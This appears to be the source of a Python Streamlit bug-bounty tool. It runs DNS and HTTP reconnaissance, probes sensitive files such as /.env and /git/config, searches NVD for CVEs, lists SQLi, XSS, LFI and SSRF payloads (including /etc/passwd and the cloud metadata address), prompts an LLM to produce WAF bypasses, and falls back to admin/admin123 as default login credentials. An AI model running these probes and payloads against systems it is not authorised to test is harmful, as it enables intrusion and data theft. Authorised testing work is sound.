#!/usr/bin/env python3
"""
🛡️ MHZALY BUG BOUNTY & OFFENSIVE SECURITY SUITE v5.5 - ENTERPRISE EDITION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Advanced Offensive Security, Automated Recon & NVD Intelligence Platform
- Target Fingerprinting & Sensitive File Fuzzing Engine
- NVD v2.0 REST Client with API Key Rate-Limit Acceleration
- Offensive Payload & Parameter Fuzzing Repository
- Groq AI Exploit Chain, Payload Mutation & WAF Bypass Assistant

Author: Muhammad Hassaan Zahid
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import streamlit as st
import requests
import pandas as pd
import socket
import ssl
import dns.resolver
import re
import urllib.parse
from datetime import datetime
from typing import Dict, List, Any

# Configure Page
st.set_page_config(
    page_title="MHZALY Enterprise Bug Bounty Suite",
    page_icon="🎯",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Disable insecure request warnings for hunting operations
requests.packages.urllib3.disable_warnings()

# ═══════════════════════════════════════════════════════════════════════════════
# 1. ENTERPRISE RECON & NVD INTELLIGENCE ENGINES
# ═══════════════════════════════════════════════════════════════════════════════

class EnterpriseReconEngine:
    """Advanced Target Profiling & Sensitive File Enumeration"""
    
    @staticmethod
    def deep_recon(target: str) -> Dict[str, Any]:
        report = {'target': target, 'status_code': None, 'server': None, 'technologies': [], 'exposed_files': [], 'dns': {}}
        
        if not target.startswith(('http://', 'https://')):
            target_url = f"https://{target}"
        else:
            target_url = target
            
        parsed_domain = urllib.parse.urlparse(target_url).netloc or target
        
        # 1. DNS Enumeration
        for rtype in ['A', 'MX', 'TXT', 'NS']:
            try:
                answers = dns.resolver.resolve(parsed_domain, rtype)
                report['dns'][rtype] = [str(r) for r in answers]
            except Exception:
                report['dns'][rtype] = []

        # 2. HTTP Probing & Fingerprinting
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugBountyEliteHunter/3.0'
        })
        
        try:
            resp = session.get(target_url, timeout=8, verify=False, allow_redirects=True)
            report['status_code'] = resp.status_code
            report['server'] = resp.headers.get('Server', 'Hidden / Unknown')
            
            body = resp.text.lower()
            headers_str = str(resp.headers).lower()
            
            # Framework & CMS Fingerprinting
            if 'wp-content' in body or 'wordpress' in headers_str:
                report['technologies'].append('WordPress CMS')
            if 'laravel' in headers_str or 'laravel_session' in str(resp.cookies):
                report['technologies'].append('Laravel PHP Framework')
            if 'react' in body or '_next' in body or 'data-reactroot' in body:
                report['technologies'].append('React / Next.js SPA')
            if 'express' in headers_str or 'connect.sid' in str(resp.cookies):
                report['technologies'].append('Node.js / Express')
            if 'cloudflare' in headers_str:
                report['technologies'].append('Cloudflare WAF / Reverse Proxy')
            if 'aws' in headers_str or 'amazon' in headers_str:
                report['technologies'].append('Amazon AWS Infrastructure')

            # Sensitive Files & Backup Fuzzing Paths
            fuzz_paths = [
                '/.env', '/robots.txt', '/sitemap.xml', '/git/config', 
                '/backup.zip', '/api/v1/users', '/swagger.ui', '/phpinfo.php',
                '/config.json', '/auth/login', '/graphql', '/debug', '/admin'
            ]
            
            base_origin = f"{urllib.parse.urlparse(target_url).scheme}://{urllib.parse.urlparse(target_url).netloc}"
            
            for path in fuzz_paths:
                test_url = base_origin + path
                try:
                    p_resp = session.get(test_url, timeout=3, verify=False)
                    if p_resp.status_code in [200, 403]:
                        if p_resp.status_code == 200 and len(p_resp.text) > 10:
                            if any(err in p_resp.text.lower() for err in ["not found", "404 page", "does not exist"]):
                                continue
                        report['exposed_files'].append({
                            'path': path, 
                            'status': p_resp.status_code, 
                            'size': len(p_resp.text)
                        })
                except Exception:
                    pass
                    
        except Exception as e:
            report['error'] = str(e)
            
        return report

class NVDIntelligenceClient:
    """NVD v2.0 Client with Optional API Key Acceleration"""
    def __init__(self, nvd_key: str = ""):
        self.base_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        self.nvd_key = nvd_key

    def search_cve(self, keyword: str, max_results: int = 10) -> List[Dict[str, Any]]:
        vulnerabilities = []
        try:
            params = {'keywordSearch': keyword, 'resultsPerPage': min(max_results, 20)}
            headers = {}
            if self.nvd_key:
                headers['apiKey'] = self.nvd_key
                
            response = requests.get(self.base_url, params=params, headers=headers, timeout=12)
            if response.status_code == 200:
                data = response.json()
                for item in data.get('vulnerabilities', []):
                    cve = item.get('cve', {})
                    cve_id = cve.get('id', 'UNKNOWN')
                    desc = cve.get('descriptions', [{}])[0].get('value', 'No description.')
                    
                    score = "N/A"
                    severity = "UNKNOWN"
                    metrics = cve.get('metrics', {})
                    if 'cvssMetricV31' in metrics:
                        cvss_data = metrics['cvssMetricV31'][0].get('cvssData', {})
                        score = cvss_data.get('baseScore', 'N/A')
                        severity = cvss_data.get('baseSeverity', 'UNKNOWN')
                        
                    vulnerabilities.append({
                        'cve_id': cve_id,
                        'description': desc,
                        'score': score,
                        'severity': severity.upper(),
                        'published': cve.get('published', '')[:10]
                    })
        except Exception as e:
            st.error(f"NVD API Error: {e}")
        return vulnerabilities

class PayloadRepository:
    """Battle-Tested Offensive Payloads"""
    @staticmethod
    def get_payloads(vector: str) -> List[str]:
        repository = {
            'SQL Injection (SQLi)': [
                "' OR '1'='1", "' OR '1'='1' --", "admin' --", 
                "1 UNION SELECT null, null, null, null--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--"
            ],
            'Cross-Site Scripting (XSS)': [
                "<script>alert(document.domain)</script>",
                "\"><script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>"
            ],
            'Local File Inclusion (LFI)': [
                "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "../../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index.php"
            ],
            'Server-Side Request Forgery (SSRF)': [
                "http://127.0.0.1:80", "http://localhost:8080",
                "http://169.254.169.254/latest/meta-data/", "http://0.0.0.0:22"
            ]
        }
        return repository.get(vector, ["No payloads defined."])

# ═══════════════════════════════════════════════════════════════════════════════
# 2. STREAMLIT ENTERPRISE UI
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    if 'authenticated' not in st.session_state:
        st.session_state.authenticated = False

    if not st.session_state.authenticated:
        col1, col2, col3 = st.columns([1, 1.2, 1])
        with col2:
            st.markdown("<br><br>", unsafe_allow_html=True)
            st.markdown("# 🎯 MHZALY Bug Bounty Suite")
            st.markdown("##### Enterprise Offensive Security & Intelligence Platform")
            
            username = st.text_input("Hunter Username")
            password = st.text_input("Hunter Password", type="password")
            
            if st.button("Authenticate Suite", use_container_width=True, type="primary"):
                correct_user = st.secrets.get("APP_USERNAME", "admin")
                correct_pass = st.secrets.get("APP_PASSWORD", "admin123")
                if username == correct_user and password == correct_pass:
                    st.session_state.authenticated = True
                    st.session_state.user = username
                    st.success("Access Granted. Initializing suite...")
                    st.rerun()
                else:
                    st.error("Authentication failed.")
        return

    groq_key = st.secrets.get("GROQ_API_KEY", "")
    nvd_key = st.secrets.get("NVD_API_KEY", "")

    with st.sidebar:
        st.markdown(f"### 🎯 Hunter: `{st.session_state.user}`")
        st.markdown("---")
        module = st.radio(
            "Offensive Menu",
            [
                "🎯 Target Recon & Endpoint Fuzzing",
                "🔍 Enterprise NVD Intelligence",
                "🧨 Exploit & Payload Repository",
                "🤖 Groq AI Exploit & WAF Bypass",
                "⚙️ Suite Status"
            ]
        )
        st.markdown("---")
        if st.button("Terminate Session", use_container_width=True):
            st.session_state.authenticated = False
            st.rerun()

    if module == "🎯 Target Recon & Endpoint Fuzzing":
        st.markdown("# 🎯 Target Reconnaissance & Sensitive Endpoint Fuzzing")
        st.markdown("Profile target apps, harvest DNS records, and uncover exposed backup files.")
        
        target_input = st.text_input("Target URL or Domain", placeholder="e.g., target-domain.com")
        
        if st.button("Launch Recon & Asset Discovery", type="primary", use_container_width=True):
            if target_input:
                with st.spinner(f"Executing offensive reconnaissance on {target_input}..."):
                    recon = EnterpriseReconEngine.deep_recon(target_input)
                    st.success("Reconnaissance cycle complete.")
                    
                    c1, c2, c3 = st.columns(3)
                    c1.metric("HTTP Status", recon.get('status_code', 'N/A'))
                    c2.metric("Web Server", recon.get('server', 'N/A'))
                    c3.metric("Exposed Endpoints", len(recon.get('exposed_files', [])))
                    
                    st.markdown("### 🌐 Authoritative DNS Records")
                    for rtype, recs in recon.get('dns', {}).items():
                        if recs:
                            st.markdown(f"**{rtype} Records:**")
                            for r in recs:
                                st.code(r)
                                
                    st.markdown("### 💻 Fingerprinted Technologies")
                    techs = recon.get('technologies', [])
                    if techs:
                        for t in techs:
                            st.markdown(f"- 🟢 `{t}`")
                    else:
                        st.info("No prominent framework signatures found.")
                        
                    st.markdown("### 📁 Exposed Sensitive Endpoints")
                    exposed = recon.get('exposed_files', [])
                    if exposed:
                        st.dataframe(pd.DataFrame(exposed), use_container_width=True)
                    else:
                        st.info("No sensitive endpoints discovered.")
            else:
                st.warning("Please specify a target.")

    elif module == "🔍 Enterprise NVD Intelligence":
        st.markdown("# 🔍 Enterprise NVD Vulnerability Intelligence")
        st.markdown("Search official NIST CVE repositories accelerated by your NVD API Key.")
        
        keyword = st.text_input("Search Software / Vendor / CVE", placeholder="e.g., apache, wordpress plugin, cve-2024")
        
        if st.button("Query NVD Database", type="primary", use_container_width=True):
            if keyword:
                with st.spinner("Fetching CVE telemetry from NIST NVD..."):
                    client = NVDIntelligenceClient(nvd_key)
                    vulns = client.search_cve(keyword)
                    
                    if vulns:
                        st.success(f"Retrieved {len(vulns)} CVE records.")
                        for v in vulns:
                            with st.expander(f"📌 {v['cve_id']} | Severity: {v['severity']} | CVSS: {v['score']}"):
                                st.markdown(f"**Published:** {v['published']}")
                                st.write(v['description'])
                    else:
                        st.info("No matching records found.")
            else:
                st.warning("Please enter a search term.")

    elif module == "🧨 Exploit & Payload Repository":
        st.markdown("# 🧨 Offensive Payload & Fuzzing Vector Repository")
        vector = st.selectbox("Select Attack Vector", ["SQL Injection (SQLi)", "Cross-Site Scripting (XSS)", "Local File Inclusion (LFI)", "Server-Side Request Forgery (SSRF)"])
        
        if st.button("Load Payloads", type="primary", use_container_width=True):
            payloads = PayloadRepository.get_payloads(vector)
            st.success(f"Loaded {len(payloads)} payloads.")
            for p in payloads:
                st.code(p, language="text")

    elif module == "🤖 Groq AI Exploit & WAF Bypass":
        st.markdown("# 🤖 Groq AI Exploit Chain & WAF Bypass Assistant")
        if not groq_key:
            st.error("Groq API Key missing in secrets.")
        else:
            prompt = st.text_area("Describe Filtering Challenge or Target Context:", placeholder="e.g., XSS payload blocked by WAF. Give obfuscated vectors.")
            if st.button("Generate Strategy", type="primary", use_container_width=True):
                if prompt:
                    with st.spinner("Generating strategy via Groq LLM..."):
                        try:
                            headers = {'Authorization': f'Bearer {groq_key}', 'Content-Type': 'application/json'}
                            payload = {
                                'model': 'mixtral-8x7b-32768',
                                'messages': [
                                    {'role': 'system', 'content': 'You are an elite Red Team operator specializing in bug bounty hunting and WAF bypass.'},
                                    {'role': 'user', 'content': prompt}
                                ],
                                'temperature': 0.5,
                                'max_tokens': 1200
                            }
                            resp = requests.post("https://api.groq.com/openai/v1/chat/completions", json=payload, headers=headers, timeout=20)
                            if resp.status_code == 200:
                                st.success("Strategy Generated.")
                                st.markdown(resp.json()['choices'][0]['message']['content'])
                            else:
                                st.error(f"API Error: {resp.status_code}")
                        except Exception as e:
                            st.error(f"Error: {e}")
                else:
                    st.warning("Please enter a prompt.")

    elif module == "⚙️ Suite Status":
        st.markdown("# ⚙️ Suite Configuration Status")
        st.write("✅ **Recon & Endpoint Fuzzing:** Operational")
        st.write(f"{'✅' if nvd_key else '⚠️'} **NVD API Key:** {'Configured & Accelerated' if nvd_key else 'Not configured (Using Public Rate Limit)'}")
        st.write("✅ **Payload Repository:** Loaded")
        st.write(f"{'✅' if groq_key else '❌'} **Groq AI Assistant:** {'Active' if groq_key else 'Missing Key'}")

if __name__ == "__main__":
    main()
